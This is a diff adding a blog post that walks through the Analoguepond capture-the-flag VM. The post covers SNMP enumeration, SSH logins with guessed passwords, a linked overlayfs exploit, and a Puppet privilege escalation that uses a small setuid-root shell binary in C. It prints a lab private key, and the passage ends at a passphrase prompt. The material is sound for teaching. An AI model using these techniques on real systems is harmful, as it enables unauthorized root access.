@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2019-05-19T20:52:52+03:00</updated>
+  <updated>2019-05-30T22:11:54+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,810 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pond. Analoguepond]]></title>
+    <link href="http://chousensha.github.io/blog/2019/05/30/pond-analoguepond/"/>
+    <updated>2019-05-30T21:45:50+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/05/30/pond-analoguepond</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s VM should be fun, since it&rsquo;s from knightmare, so we should expect lots of references! I&rsquo;m also not sure about the actual name of the box, if it&rsquo;s Analougepond or Analoguepond. A promising start =D</p>
+
+<blockquote><p>Remember TCP is not the only protocol on the Internet My challenges are never finished with root. I make you work for the flags. The intended
+route is NOT to use forensics or 0-days, I will not complain either way.</p>
+
+<p>To consider this VM complete, you need to have obtained:</p>
+
+<p>   Troll Flag: where you normally look for them</p>
+
+<p>   Flag 1: You have it when you book Jennifer tickets to Paris on Pan Am.</p>
+
+<p>   Flag 2: It will include a final challenge to confirm you hit the jackpot.</p>
+
+<p>   Have root everywhere (this will make sense once you&rsquo;re in the VM)</p>
+
+<p>   User passwords</p>
+
+<p>   2 VNC passwords</p>
+
+<p>Best of luck! If you get stuck, eat some EXTRABACON</p>
+
+<p>NB: Please allow 5-10 minutes or so from powering on the VM for background tasks to run before proceeding to attack.</p></blockquote>
+
+<!-- more -->
+
+
+<p>For the recon part, today I&rsquo;ll be using <a href="https://github.com/codingo/Reconnoitre">Reconnoitre</a></p>
+
+<blockquote><p>A reconnaissance tool made for the OSCP labs to automate information gathering and service enumeration whilst creating a directory structure to store results, findings and exploits used for > each host, recommended commands to execute and directory structures for storing loot and flags.</p></blockquote>
+
+<p>```
+reconnoitre -h
+usage: reconnoitre [-h] -t TARGET_HOSTS -o OUTPUT_DIRECTORY [-w WORDLIST]</p>
+
+<pre><code>               [-p PORT] [--pingsweep] [--dns] [--services] [--hostnames]
+               [--snmp] [--quick] [--virtualhosts]
+               [--ignore-http-codes IGNORE_HTTP_CODES]
+               [--ignore-content-length IGNORE_CONTENT_LENGTH] [--quiet]
+               [--no-udp]
+</code></pre>
+
+<p>optional arguments:
+  -h, &mdash;help            show this help message and exit
+  -t TARGET_HOSTS       Set a target range of addresses to target. Ex</p>
+
+<pre><code>                    10.11.1.1-255
+</code></pre>
+
+<p>  -o OUTPUT_DIRECTORY   Set the output directory. Ex /root/Documents/labs/
+  -w WORDLIST           Set the wordlist to use for generated commands. Ex</p>
+
+<pre><code>                    /usr/share/wordlist.txt
+</code></pre>
+
+<p>  -p PORT               Set the port to use. Leave blank to use discovered</p>
+
+<pre><code>                    ports. Useful to force virtual host scanning on non-
+                    standard webserver ports.
+</code></pre>
+
+<p>  &mdash;pingsweep           Write a new target.txt by performing a ping sweep and</p>
+
+<pre><code>                    discovering live hosts.
+</code></pre>
+
+<p>  &mdash;dns, &mdash;dnssweep     Find DNS servers from a list of targets.
+  &mdash;services            Perform service scan over targets.
+  &mdash;hostnames           Attempt to discover target hostnames and write to</p>
+
+<pre><code>                    0-name.txt and hostnames.txt.
+</code></pre>
+
+<p>  &mdash;snmp                Perform service scan over targets.
+  &mdash;quick               Move to the next target after performing a quick scan</p>
+
+<pre><code>                    and writing first-round recommendations.
+</code></pre>
+
+<p>  &mdash;virtualhosts        Attempt to discover virtual hosts using the specified</p>
+
+<pre><code>                    wordlist.
+</code></pre>
+
+<p>  &mdash;ignore-http-codes IGNORE_HTTP_CODES</p>
+
+<pre><code>                    Comma separated list of http codes to ignore with
+                    virtual host scans.
+</code></pre>
+
+<p>  &mdash;ignore-content-length IGNORE_CONTENT_LENGTH</p>
+
+<pre><code>                    Ignore content lengths of specificed amount. This may
+                    become useful when a server returns a static page on
+                    every virtual host guess.
+</code></pre>
+
+<p>  &mdash;quiet               Supress banner and headers to limit to comma dilimeted</p>
+
+<pre><code>                    results only.
+</code></pre>
+
+<p>  &mdash;no-udp              Disable UDP services scan over targets.
+```</p>
+
+<p>I ran reconnoitre and it created a directory structure with multiple files:</p>
+
+<p>```
+reconnoitre -t 192.168.159.136 &mdash;services -o .
+  <strong>
+|\&ldquo;\&rdquo;\&ldquo;-=  RECONNOITRE
+(</strong><em>_)      An OSCP scanner by @codingo</em></p>
+
+<p>[+] Testing for required utilities on your system.
+[#] Performing service scans
+[<em>] Loaded single target: 192.168.159.136
+[+] Creating directory structure for 192.168.159.136
+   [>] Creating scans directory at: ./192.168.159.136/scans
+   [>] Creating exploit directory at: ./192.168.159.136/exploit
+   [>] Creating loot directory at: ./192.168.159.136/loot
+   [>] Creating proof file at: ./192.168.159.136/proof.txt
+[+] Starting quick nmap scan for 192.168.159.136
+[+] Writing findings for 192.168.159.136
+[</em>] Found SSH service on 192.168.159.136:22
+[<em>] TCP quick scans completed for 192.168.159.136
+[+] Starting detailed TCP/UDP nmap scans for 192.168.159.136
+[+] Writing findings for 192.168.159.136
+[</em>] Found SSH service on 192.168.159.136:22
+[*] TCP/UDP scans completed for 192.168.159.136
+```</p>
+
+<p>The files contain the commands that were run and the output, along with recommendations. The scans revealed that SSH and SNMP are open on the box:</p>
+
+<p><code>
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-info:
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: 096a5051642b555800000000
+|   snmpEngineBoots: 19
+|_  snmpEngineTime: 3h58m00s
+| snmp-sysdescr: Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
+|_  System uptime: 3h58m0.20s (1428020 timeticks)
+Service Info: Host: analoguepond
+</code></p>
+
+<p>Next I enumerated the SNMP information:</p>
+
+<p>```
+snmp-check 192.168.159.136
+snmp-check v1.9 &ndash; SNMP enumerator
+Copyright &copy; 2005-2015 by Matteo Cantoni (www.nothink.org)</p>
+
+<p>[+] Try to connect to 192.168.159.136:161 using SNMPv1 and community &lsquo;public&rsquo;</p>
+
+<p>[*] System information:</p>
+
+<p>  Host IP address               : 192.168.159.136
+  Hostname                      : analoguepond
+  Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
+  Contact                       : Eric Burdon <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#101;&#114;&#x69;&#99;&#64;&#x65;&#120;&#97;&#109;&#112;&#108;&#x65;&#x2e;&#99;&#x6f;&#109;">&#101;&#x72;&#x69;&#x63;&#64;&#101;&#x78;&#97;&#109;&#112;&#108;&#x65;&#46;&#x63;&#x6f;&#109;</a>
+  Location                      : There is a house in New Orleans they call it&hellip;
+  Uptime snmp                   : 05:15:30.80
+  Uptime system                 : 05:15:20.10
+  System date                   : 2019-5-23 15:39:09.0
+```</p>
+
+<p>We have a possible user account called <em>eric</em>. I googled the line about New Orleans and found it&rsquo;s from a song:</p>
+
+<blockquote><p>There is a house in New Orleans
+They call the rising sun</p></blockquote>
+
+<p>The credentials <code>eric/therisingsun</code> worked for SSH. In the home directory I found a funny image that may be useful for something later:</p>
+
+<p><img class="center" src="/images/pentest/analoguepond/reticulatingsplines.gif" title="&lsquo;reticulatingsplines&rsquo; &lsquo;reticulatingsplines&rsquo;" ></p>
+
+<p>I ran LinEnum on the box and noticed some VMs running on it:</p>
+
+<p><code>
+[-] ARP history:
+barringsbank.example.com (192.168.122.3) at 52:54:00:6d:93:6a [ether] on virbr0
+? (192.168.159.129) at 00:0c:29:9c:6f:0f [ether] on eth0
+puppet.example.com (192.168.122.2) at 52:54:00:5b:05:f7 [ether] on virbr0
+? (192.168.159.1) at 00:50:56:c0:00:01 [ether] on eth0
+</code></p>
+
+<h2>Troll flag</h2>
+
+<p>The OS running is Ubuntu 14.04.5 LTS, so it&rsquo;s vulnerable to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. With it, I got root easily, and read the first flag:</p>
+
+<p>```
+root@analoguepond:/root# cat flag.txt
+C'Mon Man! Y'all didn&rsquo;t think this was the final flag so soon&hellip;?</p>
+
+<p>Did the bright lights and big city knock you out&hellip;? If you pull
+a stunt like this again, I&rsquo;ll send you back to Walker&hellip;</p>
+
+<p>This is obviously troll flah #1 So keep going.
+```</p>
+
+<h2>2 VNC passwords</h2>
+
+<p>Ok, we have root, but this is only the beginning. We know that we should find 2 VNC passwords, and they are probably for the 2 VMs we identified earlier. I confirmed it:</p>
+
+<p><code>
+root@analoguepond:/etc/libvirt/qemu# netstat -antp | grep 5900
+tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1260/qemu-system-x8
+</code></p>
+
+<p>I searched for the VM configuration files, they were located in <code>/etc/libvirt/qemu</code>:</p>
+
+<p><code>
+root@analoguepond:/etc/libvirt/qemu# ls *.xml
+barringsbank.xml  puppet.xml
+</code></p>
+
+<p>I read the files and found the password for <strong>barringsbank</strong> is <code>memphistennessee</code>, while the password for <strong>puppet</strong> is <code>sendyoubacktowalker</code>. Since nc was installed on the box, I used it to port scan the VMs. They didn&rsquo;t have 5900 port open, but they did have SSH listening:</p>
+
+<p><code>
+root@analoguepond:/etc/libvirt/qemu# nc -zv 192.168.122.3 22
+Connection to 192.168.122.3 22 port [tcp/ssh] succeeded!
+root@analoguepond:/etc/libvirt/qemu# nc -zv 192.168.122.2 22
+Connection to 192.168.122.2 22 port [tcp/ssh] succeeded!
+</code></p>
+
+<h2>Rooting puppet</h2>
+
+<p>I tried to SSH on the puppet VM first, to see if I can get any info, and the banner did not disappoint:</p>
+
+<p><code>
+ssh root@192.168.122.2
++-----------------------------------------------------------------------------+
+| Passwords are very dated.. Removing spaces helps sandieshaw log in with her |
+| most famous song                                                            |
++-----------------------------------------------------------------------------+
+</code></p>
+
+<p>We found out there&rsquo;s a sandieshaw user and got a hint for the password. After a little Googling, I learned that one of Sandie Shaw&rsquo;s most famous songs is Puppet on a String..and this suits the VM, so I removed the spaces and tried lowercase first, and got in with <code>sandieshaw/puppetonastring</code>.</p>
+
+<p>This seems to be a Puppet-centric machine. Puppet is a tool for automating infrastructure and software configuration management. You can learn more from <a href="https://puppet.com/">https://puppet.com/</a></p>
+
+<p>Back to the machine, I checked that Puppet is running:</p>
+
+<p><code>
+sandieshaw@puppet:~/.puppet$ ps aux | grep puppet
+puppet    1020  0.9  5.1 315408 52728 ?        Ssl  09:21   0:46 /usr/bin/ruby /usr/bin/puppet master
+root      3408  0.5  0.0   4448   672 ?        Ss   10:40   0:00 /bin/sh -c /usr/bin/puppet agent --test &gt; /dev/null 2&gt;&amp;1
+root      3409 24.8  1.9  79220 20312 ?        Sl   10:40   0:04 /usr/bin/ruby /usr/bin/puppet agent --test
+</code></p>
+
+<p>Then I looked inside puppet&rsquo;s config directory, in <em>/etc/puppet</em>, and I found lots of configuration files for the barringsbank VM inside <code>modules/vulnhub/files/</code>:</p>
+
+<p><code>
+sandieshaw@puppet:/etc/puppet/modules/vulnhub/files$ ls
+barringsbank-group    barringsbank-passwd       hosts.deny    puppet-hosts.allow  puppet-sshd_config  sudoers
+barringsbank-hosts.allow  barringsbank-sshd_config  puppet-group  puppet-passwd       sshd_config     sudoers.d
+</code></p>
+
+<p>In the <em>barringsbank-passwd</em> file, I found the user list, the interesting one to keep in mind is:</p>
+
+<p><code>
+nleeson:x:1000:1000:Nicholas Leeson,,,:/home/nleeson:/bin/bash
+</code></p>
+
+<p>Continuing with the information gathering, the <em>barringsbank-sshd_config</em> reveals that public key authentication is used for SSH on the VM.</p>
+
+<p>Inside <em>manifests</em> there&rsquo;s a module called <em>init.pp</em> that removes from the system the useful command line utilities lice nmap, ncaat, etc. and reverses changes to key system files. It&rsquo;s pretty funny and contains references to various Vulnhub users.</p>
+
+<p>```</p>
+
+<h2>Module to unwind changed #vulnhub people make.  This will unwind the most</h2>
+
+<h2>common vectors they used to get at my other VMs</h2>
+
+<p>class vulnhub {</p>
+
+<h2>purge packages they abuse too (hello mrB3n, GKNSB, Ch3rn0byl, mr_h4sh)</h2>
+
+<p>$purge = [ &ldquo;nano&rdquo;, &ldquo;wget&rdquo;, &ldquo;curl&rdquo;, &ldquo;fetch&rdquo;,&ldquo;nmap&rdquo;, &ldquo;netcat-traditional&rdquo;,</p>
+
+<pre><code>       "ncat", "netdiscover", "lftp" ]
+</code></pre>
+
+<p>  package { $purge:
+  ensure => purged,
+  }</p>
+
+<h2>The encryption is still primative Egyptian (Hello drweb)</h2>
+
+<p>$theresas_nightmare = [ &ldquo;cryptcat&rdquo;, &ldquo;socat&rdquo; ]
+  package { $theresas_nightmare:
+  ensure => present,
+  }</p>
+
+<h2>Adding to sudoers is a bit naughty so reverse that (most of #vulnhub)</h2>
+
+<p>file { &ldquo;/etc/sudoers.d&rdquo;:
+  ensure => &ldquo;directory&rdquo;,
+  recurse => true,
+  purge   => true,
+  force   => true,
+  owner   => root,
+  group   => root,
+  mode    => 0755,
+  source  => &ldquo;puppet:///modules/vulnhub/sudoers.d&rdquo;,
+  }</p>
+
+<h2>revert /etc/passwd (Hey rfc, kevinnz!)</h2>
+
+<p>file {&lsquo;/etc/sudoers&rsquo;:
+  ensure => present,
+  owner  => root,
+  group  => root,
+  mode   => 0440,
+  source => &ldquo;puppet:///modules/vulnhub/sudoers&rdquo;,
+  }</p>
+
+<h2>revert /etc/passwd (Hey Rasta_Mouse!)</h2>
+
+<p>file {&lsquo;/etc/passwd&rsquo;:
+  ensure => present,
+  owner  => root,
+  group  => root,
+  mode   => 0644,
+  source => &ldquo;puppet:///modules/vulnhub/${hostname}-passwd&rdquo;,
+  }</p>
+
+<h2>and /etc/group (Hello to you cmaddy)</h2>
+
+<p>file {&lsquo;/etc/group&rsquo;:
+  ensure => present,
+  owner  => root,
+  group  => root,
+  mode   => 0644,
+  source => &ldquo;puppet:///modules/vulnhub/${hostname}-group&rdquo;,
+  }</p>
+
+<h2>Mr Potato Head! BACKDOORS ARE NOT SECRETS (Hey GKNSB!)</h2>
+
+<p>file {&lsquo;/etc/ssh/ssd_config&rsquo;:
+  ensure => present,
+  owner  => root,
+  group  => root,
+  mode   => 0644,
+  source => &ldquo;puppet:///modules/vulnhub/${hostname}-sshd_config&rdquo;,
+  notify => Service[&ldquo;ssh&rdquo;],
+  }</p>
+
+<h2>Leave US keyboard for those crazy yanks, and not to torture Ch3rn0byl like</h2>
+
+<h2>Gibson</h2>
+
+<p>cron { &ldquo;puppet check in&rdquo;:
+  command => &ldquo;/usr/bin/puppet agent &mdash;test > /dev/null 2>&amp;1&rdquo;,
+  user => &ldquo;root&rdquo;,
+  minute => &ldquo;*/10&rdquo;,
+  ensure => present,
+  }</p>
+
+<h2>Everyone forbidden by default (Hey wrboyce, rasta_mouse, 8bitkiwi)</h2>
+
+<p>file {&lsquo;/etc/hosts.deny&rsquo;:
+  ensure => present,
+  owner  => root,
+  group  => root,
+  mode   => 0644,
+  source => &ldquo;puppet:///modules/vulnhub/hosts.deny&rdquo;,
+  }</p>
+
+<h2>Firewall off to only specific hosts (Hello Bas!)</h2>
+
+<p>file {&lsquo;/etc/hosts.allow&rsquo;:
+  ensure => present,
+  owner  => root,
+  group  => root,
+  mode   => 0644,
+  source => &ldquo;puppet:///modules/vulnhub/${hostname}-hosts.allow&rdquo;,
+  }</p>
+
+<h2>Don&rsquo;t fill up the disk (Hey GlobalMaquereau, g0bl1n)</h2>
+
+<p>tidy { &ldquo;/var/lib/puppet/reports&rdquo;:
+   age     => &ldquo;1h&rdquo;,
+   recurse => true,
+  }</p>
+
+<h2>Changing openssh config requires restart</h2>
+
+<p>service { &lsquo;ssh&rsquo;:
+  ensure      => running,
+  enable      => true,
+  hasstatus   => true,
+  hasrestart  => true,
+  }</p>
+
+<p>}
+```</p>
+
+<p>Inside the <em>fiveeights</em> module there&rsquo;s another file referencing the contents of SSH authorized keys for the nleeson user:</p>
+
+<p>```
+sandieshaw@puppet:/etc/puppet/modules$ cat fiveeights/manifests/init.pp</p>
+
+<h2>Nick&rsquo;s secret file hide the screw-ups</h2>
+
+<p>class fiveeights {</p>
+
+<h2>private key held elsewhere. Keep looking</h2>
+
+<p>  file { &lsquo;/home/nleeson/.ssh/authorized_keys&rsquo;:
+  content => &ldquo;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTPnm+I5zEPNUHc1PgmsIxK8XCvtRECY6nTFOdNL3CxVBepWLv0wgPWBIUAkP9nfPUshXo1EIjcvb0+RGtJ8KNbVK4vW2ZCwgNicUoYnCcVtSrGtz9oAnKpeGcCKAuHG6ybt4Opxe75eF4dZt2/aDRrPMw8PK8l8a3o9ZdJlIgdLiWORPiga/zUu1zuySkQPFHzPBp29MvWVwAYsssEjcXINfuvysPbdBzMJaJ2o4jmFV9g/uCz3xjRi9zULP1VpoRYtZUQadU2CpuN1RtVDeoSeYVe6vYkeLz6rCBQTUfi9Nea4X1JtvaTfnrquRMWOr43WnMMcdFpIsBd8oCI4jH root@puppet&rdquo;,
+  }
+}
+```</p>
+
+<p>Another interesting module is the <em>wiggle</em> one, that references a binary called <em>spin</em> that needs to be present in /tmp, and when puppet runs it will change its ownership to root and make it SUID:</p>
+
+<p>```
+sandieshaw@puppet:/etc/puppet/modules$ cat wiggle/manifests/init.pp</p>
+
+<h2>My first puppet module by Nick Leeson &copy; Barringsbank</h2>
+
+<h2>Put spin binary in /tmp to confirm puppet is working</h2>
+
+<p>class wiggle {</p>
+
+<p>file { [ &ldquo;/tmp/spin&rdquo; ]:
+  ensure  => present,
+  mode    => 4755,
+  owner   => root,
+  group   => root,
+  source  => &ldquo;puppet:///modules/wiggle/spin&rdquo;;
+  }</p>
+
+<p>}
+```</p>
+
+<p>This module looks like the way in for privilege escalation. You can find the spin binary and its source code inside <em>/etc/puppet/modules/wiggle/files</em>, it just spins the cursor and outputs a character out of a list. Not too useful, but our sandieshaw user is the owner and has write permissions over it:</p>
+
+<p><code>
+sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls -l
+total 724
+-rwxrwxr-x 1 sandieshaw sandieshaw 733480 Dec 21  2016 spin
+-rw-rw-r-- 1 sandieshaw sandieshaw    376 Dec 17  2016 spin.c
+</code></p>
+
+<p>In order to exploit this, I created a malicious spin executable with a SUID shell:</p>
+
+<p>```c</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;sys/types.h></h1>
+
+<h1>include &lt;unistd.h></h1>
+
+<p>int main(void)
+{</p>
+
+<pre><code>setuid(0);
+setgid(0);
+system("/bin/sh");
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Then I copied it to the box:</p>
+
+<p><code>plain
+scp spin eric@192.168.159.136:/home/eric
+</code></p>
+
+<p>Next I transferred it to the puppet VM:</p>
+
+<p><code>
+eric@analoguepond:~$ scp spin sandieshaw@192.168.122.2:/etc/puppet/modules/wiggle/files/spin
+sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls -l spin
+-rwxrwxr-x 1 sandieshaw sandieshaw 16712 May 29 15:42 spin
+</code></p>
+
+<p>The next time the puppet agent runs, it puts the malicious spin binary in /tmp and makes it SUID root:</p>
+
+<p><code>
+ls -l /tmp
+total 20
+-rwsr-xr-x 1 root root 16712 May 29 15:43 spin
+</code></p>
+
+<p>We are now able to become root:</p>
+
+<p>```
+sandieshaw@puppet:~$ /tmp/spin</p>
+
+<h1>ls /root</h1>
+
+<p>protovision
+```</p>
+
+<p>Inside /root/protovision we find some files and a hidden directory:</p>
+
+<p>```</p>
+
+<h1>ls -alh</h1>
+
+<p>total 24K
+drwxr-xr-x 3 root root 4.0K Dec 21  2016 .
+drwx&mdash;&mdash;&mdash; 4 root root 4.0K Jan  7  2017 ..
+-rw-r&mdash;r&mdash; 1 root root  401 Dec 21  2016 flag1.txt.0xff
+drwxr-xr-x 3 root root 4.0K Dec 21  2016 .I_have_you_now
+-rw-r&mdash;r&mdash; 1 root root   39 Dec 17  2016 jim
+-rw-r&mdash;r&mdash; 1 root root   53 Dec 17  2016 melvin
+```</p>
+
+<p>Checking the flag first:</p>
+
+<p>```</p>
+
+<h1>cat flag1.txt.0xff</h1>
+
+<p>3d3d674c7534795a756c476130565762764e4849793947496c4a585a6f5248496b4a3362334e3363684248496842435a756c6d5a675148616e6c5762675533623542434c756c47497a564764313557617442794d79415362764a6e5a674d585a7446325a79463256676732593046326467777961793932646751334a754e585a765247497a6c47613042695a4a4279615535454d70647a614b706b5a48316a642f67325930463264763032626a35535a6956486431395765756333643339794c364d486330524861
+```</p>
+
+<p>This hex string is decoded to a revere base64 string:</p>
+
+<p><code>
+==gLu4yZulGa0VWbvNHIy9GIlJXZoRHIkJ3b3N3chBHIhBCZulmZgQHanlWbgU3b5BCLulGIzVGd15WatByMyASbvJnZgMXZtF2ZyF2Vgg2Y0F2dgwyay92dgQ3JuNXZvRGIzlGa0BiZJByaU5EMpdzaKpkZH1jd/g2Y0F2dv02bj5SZiVHd19Weuc3d39yL6MHc0RHa
+</code></p>
+
+<p>I reversed it and decoded it for this hint:</p>
+
+<p><code>
+https://www.youtube.com/watch?v=GfJJk7i0NTk If this doesn't work, watch Wargames from 23 minutes in, you might find a password there or something...
+</code></p>
+
+<p>Watching the clip, the interesting line is the shouted &ldquo;Backdoors are not secrets&rdquo;. This is confirmed by the jim and melvin files:</p>
+
+<p>```</p>
+
+<h1>cat jim</h1>
+
+<p>Mr Potato Head! Backdoors are not a&hellip;</p>
+
+<h1>cat melvin</h1>
+
+<p>Boy you guys are dumb! I got this all figured out&hellip;
+```</p>
+
+<p>Inside the hidden folder we find a picture and another hidden folder:</p>
+
+<p><code>
+drwxr-xr-x 3 root root 4.0K Dec 18  2016 .a
+-r-------- 1 root root  71K Dec 18  2016 grauniad_1995-02-27.jpeg
+</code></p>
+
+<p>The picture states that Barings Bank goes bust. The hidden folder goes on with another and another so I enumerated all:</p>
+
+<p>```</p>
+
+<h1>find . -type d</h1>
+
+<p>.
+./.a
+./.a/.b
+./.a/.b/.c
+./.a/.b/.c/.d
+./.a/.b/.c/.d/.e
+./.a/.b/.c/.d/.e/.f
+./.a/.b/.c/.d/.e/.f/.g
+./.a/.b/.c/.d/.e/.f/.g/.h
+./.a/.b/.c/.d/.e/.f/.g/.h/.i
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u.
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v.
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w.
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x.
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x./y
+./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x./y/.z
+```</p>
+
+<p>All the way down, we find 2 files:</p>
+
+<p>```</p>
+
+<h1>ls</h1>
+
+<p>my_world_you_are_persistent_try  nleeson_key.gpg
+```</p>
+
+<p>Let&rsquo;s see what we have here:</p>
+
+<p>```</p>
+
+<h1>cat my_world_you_are_persistent_try</h1>
+
+<p>joshua
+```</p>
+
+<p>Might be a password for something later. The other file is related to the nleeson user we found on the other VM a while ago. I tried to decrypt it with the password <em>secrets</em>, but it didn&rsquo;t work. But the hint in the jim file was referring to a secret, so I tried <code>secret</code> and it decrypted a private SSH key for nleeson:</p>
+
+<p>```</p>
+
+<h1>gpg -d nleeson_key.gpg</h1>
+
+<p>gpg: CAST5 encrypted data
+gpg: gpg-agent is not available in this session
+gpg: encrypted with 1 passphrase
+&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,1864E0393453C88F778D5E02717B8B16</p>
+
+<p>RTSpHZnf1Onpy3OHfSat0Bzbrx8wd6EBKlbdZiGjEB0AC4O0ylrSBoWsEJ/loSL8
+jdTbcSG0/GWJU7CS5AQdK7KctWwqnOHe9y4V15gtZcfgxNLrVfMUVAurZ3n2wQqK
+ARmqBXhftPft8EBBAwWwQmBrD+ufF2uaJoKr4Bfu0zMFQxRnNDooBes5wyNO/7k6
+osvGqTEX/xwJG1GB5X0jsDCmBH4WXhafa0nzZXvd2Pd3UpaWPEgyq3vxIQaredR8
+VbJbPSeKypTIj3UyEj+kjczhCiWw9t0Mv0aV4FtMOesnDQYJskL8kSLGRkN+7lHD
+IcHz7az9oqYGBSq77lPkmk7oIpT/pg80pfCyHExROwlTRPzVRHv7KGiKd35R0Hl9
+7CUQPCjH5ltQW4B6XUmxmoT8N14w5HOxb/JlV7s2g6dXYT0azOeqDsGivpgMY3vy
+rtVakLIsZeYaZYSr6WvTFclXWYctYPMgzRewiRPjyn6DXiD6MtCJZj2CqJ47tP37
+eRRgRRH6a1Sm/BkfSPIXlV0tTpOXfjtHG7VoIc5X343GL/WHM/nhNFvMLdRnVXRM
+YOEKAsYklBLqZ99btTESwJZt9HG/cGpQrbgFwxKPoJy7f5wNLOa1ZhpDyw1IqokO
+Pq4r8zZj4ASyg3gl7ByG11C272mkMG8yiIwOckVgNec/se18PUGBw1HHgRuyzDym
+/6/cwkDzoJlResjsNDQCQcNzSOoZxi3GFIIiB+HjG84MF+ofnn3ayaUZLUaBbPMJ
+jQ7dP6wqIMYwY5ZM6nRQ+RnL6QVBHnXH9RjmbzdVMzmQDjPS0lOg5xkU8B78vG6e
+lphvmlLSM+PFVOqPwhVB8yon97aU23npKIOPu44VsUXU0auKI94qoX0I1EDDQFrE
+UqpWUpCCHrRRTZCdnnE6RnJZ+rjGPvFA95lhUp1fpF8l4U3a8qKlsdtWmzYxHdyg
++w0QE8VdDsNqgCP7W6KzvN5E5HJ0bbQasadAX5eDd6I94V0fCZrPlzM+5CAXH4E4
+qhmWQPCw7Q1CnW61yG8e9uD1W7yptK5NyZpHHkUbZGIS+P7EZtS99zDPh3V4N7I2
+Mryzxkmi2JyQzf4T1cfK7JTdIC2ULGmFZM26BX3UCV0K+9OOGgRDPU4noS0gNHxP
+VaWVmjGgubE4GDlW0tgw1ET+LaUdAv/LE+3gghpRLn1imdaW9elnIeaVeOWcyrBC
+Ypl8AjYXNRd0uLWBC8xbakmK1tZUPXwefqjQpKjuIuYmmVes3M4DFxGQajmK03nO
+oGaByHu0RVjy0x/zBuOuOp6eKpeaiLWfLM5DSIWlksL/2dmAloSs3LrIPu4dTnRb
+v2YQ+72nLI62alLEaKwXUBoHSSRNTv0hbOyvV8YUp4EmJ8yShAmEE/n9Et62BwYB
+rsi0RhEfih+43PzlwB91I4Elr2k3eBwQ9XiF3KdVgj6wvwqNLZ7aC5YpLcYaVyNT
+fKzUxX02Ejvo60xWJ8u6GIhUK404s2WVeG/PCLwtrKGjpyPCn3yCWpCWpGPuVNrx
+Wg0Um581e4Vw5CLDL5hRLmo7wiqssuL3/Uugf/lc2vF+MxJyoI1F9Zkt2xvRYrLB
+&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
+gpg: WARNING: message was not integrity protected
+```</p>
+
+<p>I extracted the private key and used it to SSH to the other VM as nleeson. It asked for a passphrase, and I used <em>joshua</em> from the file:</p>
+
+<p>```
+gpg nleeson_key.gpg > nleeson_key
+chmod 600 nleeson</p>
+
+<h1>ssh -i nleeson <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#110;&#108;&#101;&#101;&#x73;&#111;&#x6e;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#49;&#x32;&#50;&#x2e;&#x33;">&#110;&#108;&#x65;&#101;&#x73;&#x6f;&#110;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#46;&#49;&#50;&#50;&#46;&#x33;</a></h1>
+
+<p>Enter passphrase for key &lsquo;nleeson&rsquo;:
